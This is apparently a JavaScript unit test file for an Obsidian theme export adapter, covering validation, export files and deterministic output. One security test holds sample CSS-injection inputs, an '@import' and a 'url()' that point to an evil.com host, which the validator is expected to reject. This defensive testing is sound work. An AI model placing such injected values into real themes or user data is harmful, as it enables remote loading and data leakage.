import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import {
  obsidianAdapter,
  OBSIDIAN_SUPPORTED_VERSION,
  buildObsidianThemeCss,
  buildObsidianManifestJson,
} from '../src/index.js';

const sampleProject = JSON.parse(
  readFileSync(new URL('../../../../contracts/sample.theme.json', import.meta.url), 'utf8')
);

test('obsidianAdapter: metadata and supported versions', () => {
  assert.equal(obsidianAdapter.id, 'obsidian');
  assert.equal(obsidianAdapter.displayName, 'Obsidian');
  assert.deepEqual(obsidianAdapter.supportedVersions, ['1.15.0']);
});

test('obsidianAdapter: getControls returns background, text and syntax controls', () => {
  const controls = obsidianAdapter.getControls(sampleProject, OBSIDIAN_SUPPORTED_VERSION);
  assert.ok(controls.length >= 10);
  assert.ok(controls.every((c) => c.supported === true));

  const bgControl = controls.find((c) => c.id === 'obsidian.bg.primary');
  assert.ok(bgControl);
  assert.equal(bgControl.binding.scope, 'shared');
  assert.equal(bgControl.binding.key, 'canvas');
});

test('obsidianAdapter: validation succeeds for valid project and version', () => {
  const issues = obsidianAdapter.validate(sampleProject, OBSIDIAN_SUPPORTED_VERSION);
  const errors = issues.filter((i) => i.severity === 'error');
  assert.equal(errors.length, 0);
});

test('obsidianAdapter: rejects unsupported version', () => {
  const issues = obsidianAdapter.validate(sampleProject, '1.14.0');
  assert.ok(issues.some((i) => i.code === 'OBSIDIAN_UNSUPPORTED_VERSION'));
});

test('obsidianAdapter: security boundaries reject CSS injection and remote assets', () => {
  // Prohibited @import
  const importAttack = {
    ...sampleProject,
    name: 'Theme @import url(https://evil.com/leak.css);',
  };
  assert.ok(
    obsidianAdapter.validate(importAttack, OBSIDIAN_SUPPORTED_VERSION).some(
      (i) => i.code === 'OBSIDIAN_SECURITY_VIOLATION'
    )
  );

  // Prohibited url(...) in override
  const urlAttack = {
    ...sampleProject,
    appOverrides: {
      obsidian: {
        '--background-primary': 'url(http://evil.com/bg.png)',
      },
    },
  };
  const issues = obsidianAdapter.validate(urlAttack, OBSIDIAN_SUPPORTED_VERSION);
  assert.ok(issues.some((i) => i.code === 'OBSIDIAN_SECURITY_VIOLATION' || i.code === 'OBSIDIAN_INVALID_OVERRIDE_COLOR'));

  // Invalid CSS variable name (missing -- prefix)
  const nonVarAttack = {
    ...sampleProject,
    appOverrides: {
      obsidian: {
        'background-color': '#112233',
      },
    },
  };
  assert.ok(
    obsidianAdapter.validate(nonVarAttack, OBSIDIAN_SUPPORTED_VERSION).some(
      (i) => i.code === 'OBSIDIAN_INVALID_OVERRIDE_KEY'
    )
  );
});

test('obsidianAdapter: export succeeds and produces offline native theme files', async () => {
  const result = await obsidianAdapter.export(sampleProject, OBSIDIAN_SUPPORTED_VERSION);

  assert.equal(result.issues.filter((i) => i.severity === 'error').length, 0);
  assert.equal(result.files.length, 3);

  const filePaths = result.files.map((f) => f.path);
  assert.ok(filePaths.includes('manifest.json'));
  assert.ok(filePaths.includes('theme.css'));
  assert.ok(filePaths.includes('README.md'));

  // Manifest verification
  const manifestFile = result.files.find((f) => f.path === 'manifest.json');
  assert.ok(manifestFile);
  const manifest = JSON.parse(/** @type {string} */ (manifestFile.content));
  assert.equal(manifest.name, sampleProject.name);
  assert.equal(manifest.version, '1.0.0');
  assert.equal(manifest.minAppVersion, OBSIDIAN_SUPPORTED_VERSION);

  // Theme CSS verification
  const cssFile = result.files.find((f) => f.path === 'theme.css');
  assert.ok(cssFile);
  const css = /** @type {string} */ (cssFile.content);
  assert.ok(css.includes('.theme-dark {'));
  assert.ok(css.includes('--background-primary: #171C25;'));
  assert.ok(css.includes('--text-normal: #F1F3F5;'));
  assert.ok(css.includes('--interactive-accent: #91B1F1;'));

  // Strict offline check
  assert.equal(css.includes('@import'), false);
  assert.equal(css.includes('url('), false);
  assert.equal(css.includes('http://'), false);
  assert.equal(css.includes('https://'), false);

  // Install & remove steps verification
  assert.ok(result.installSteps.length >= 4);
  assert.ok(result.removeSteps.length >= 2);
  assert.ok(result.installSteps.some((s) => s.includes('.obsidian/themes/')));
});

test('obsidianAdapter: export returns no partial files when validation fails', async () => {
  const badProject = {
    ...sampleProject,
    tokens: {
      ...sampleProject.tokens,
      canvas: 'invalid-hex',
    },
  };

  const result = await obsidianAdapter.export(badProject, OBSIDIAN_SUPPORTED_VERSION);
  assert.equal(result.files.length, 0);
  assert.ok(result.issues.some((i) => i.severity === 'error'));
});

test('obsidianAdapter: deterministic export output across multiple runs', async () => {
  const res1 = await obsidianAdapter.export(sampleProject, OBSIDIAN_SUPPORTED_VERSION);
  const res2 = await obsidianAdapter.export(sampleProject, OBSIDIAN_SUPPORTED_VERSION);

  for (let i = 0; i < res1.files.length; i++) {
    assert.equal(res1.files[i].path, res2.files[i].path);
    assert.equal(res1.files[i].content, res2.files[i].content);
  }
});
